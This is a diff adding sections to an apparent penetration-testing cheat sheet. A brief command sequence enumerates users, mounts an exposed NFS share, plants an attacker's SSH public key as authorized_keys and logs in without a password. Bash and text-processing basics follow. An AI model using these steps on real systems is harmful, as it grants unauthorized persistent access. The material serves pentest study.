@@ -708,5 +708,124 @@ _INSIDE DTD FILE_
 
 [https://github.com/corneacristian/Notes](https://github.com/corneacristian/Notes)
 
+## Enumerate Users via Finger
+
+`finger $user@$IP`
+
+## Show nfs shares available
+
+`showmount -e $IP`
+
+## Use nfspysh to mount share and create .ssh directory
+
+nfspysh -o server=192.168.0.20:/home/user
+
+mkdir .ssh
+
+cd .ssh
+
+## Transfer attacker public key to host with FTP
+
+put /tmp/authorized\_keys
+
+exit
+
+## Login to SSH server with no password
+
+SSH\_AUTH\_SOCK=0 ssh user@192.168.0.20
+
+## Bash Basics
+
+\[+\] nano Shortcuts
+
+```markup
+ctrl v			Next page.
+ctrl y			Previous page.
+ctrl w			Where is (find).
+ctrl k			Cut that line of test.
+ctrl x     	Exit editor.
+```
+
+\[+\] Create a text file:
+
+```markup
+touch file		Creates an empty file.
+ifconfig > tmp	pipe the output of a command
+nano file
+```
+
+\[+\] Create a file and append text to it:
+
+```markup
+ifconfig > tmp     
+echo >> tmp
+ping google.com -c3 >> tmp
+```
+
+\[+\] How to view a file:
+
+```markup
+cat file		    Show entire contents of file.
+more file		    Show one page at a time.  Space bar for next page and (q) to exit.
+head file		    Show the first 10 lines.
+head -15 file   Show the first 15 lines.
+tail file		    Show the last 10 lines.
+tail -15 file	  Show the last 15 lines.
+tail -f file	  Useful when viewing the output of a log file.
+```
+
+\[+\] Word Count
+
+```markup
+wc -l tmp2		Count the number of lines in a file
+```
+
+\[+\] sort
+
+```markup
+sort -u file                                        Sort by unique		
+sort -t . -k 1,1n -k 2,2n -k 3,3n -k 4,4n            Sort IP addresses correctly
+cat tmp2 | cut -d '(' -f2 | cut -d ')' -f1 | sort -u		Isolate the IP address
+```
+
+\[+\] awk
+
+```markup
+awk '{print $1}' file 		Show the 1st column.
+awk '{print $1,$5}' file 	Show the 1st and 5th columns.
+```
+
+\[+\] egrep -v
+
+```markup
+Remove multiple strings	egrep -v '(red|white|blue)' file
+```
+
+\[+\] sed
+
+```markup
+sed 's/FOO/BAR/g' file 		Replace FOO with BAR.
+sed 's/FOO//g' file 		Replace FOO with nothing.
+sed '/^FOO/d' file 			Remove lines that start with FOO.
+```
+
+
+
+\[+\] colors
+
+```markup
+31=red 32=green 33=yellow 34=blue 35=magenta 36=cyan 
+echo -e "\e[1;34mThis is a blue text.\e[0m"
+```
+
+\[+\] Make a file executable.
+
+```markup
+chmod +x file
+chmod 755 file
+```
+
+## 
+
 
 
